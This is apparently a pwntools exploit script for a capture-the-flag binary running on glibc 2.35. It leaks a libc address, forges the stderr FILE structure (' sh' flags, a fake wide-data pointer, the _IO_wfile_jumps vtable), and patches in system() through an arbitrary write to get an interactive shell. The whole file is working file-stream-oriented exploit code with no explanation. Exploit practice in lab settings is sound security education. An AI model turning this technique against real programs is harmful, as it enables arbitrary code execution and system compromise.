from pwn import *

# glibc 2.35

r = remote("localhost", 31337)
# r = process("./chal")

context.binary = ELF('./chal')
libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


libc_printf = int(r.recvline().strip().decode(), 16)
libc_base = libc_printf - libc.symbols["printf"]
log.info("libc_printf: "+hex(libc_printf))
log.info("libc_base: "+hex(libc_base))
libc.address = libc_base

input("@")

libc_system = libc.symbols['system']
log.info("libc_system: "+hex(libc_system))

libc_stderr = libc.symbols['_IO_2_1_stderr_']
log.info("libc_stderr: "+hex(libc_stderr))

fake_wide_data_addr = libc_stderr - 0x10
log.info("fake_wide_data_addr: "+hex(fake_wide_data_addr))

# Forge stderr
fake_fp                = FileStructure(0)
fake_fp.flags          = u64(b'  sh\x00\x00\x00\x00')
fake_fp._IO_write_base = 0
fake_fp._IO_write_ptr  = 1 # _IO_write_ptr > _IO_write_base
fake_fp._wide_data     = fake_wide_data_addr
fake_fp.vtable         = libc.symbols['_IO_wfile_jumps']


fake_fp_bytes = bytes(fake_fp)
log.info("fake_fp size: "+hex(len(fake_fp_bytes)))

fake_fp_bytes = fake_fp_bytes[:0xc8] \
                + p64(libc.symbols['system']) \
                + p64(libc_stderr+0xc8-0x68) \
                + fake_fp_bytes[0xd8:]  # fake_fp.vtable


input("@")

what = fake_fp_bytes
where = hex(libc_stderr).encode()

r.sendlineafter(b">", where)
r.sendline(what)

r.interactive()
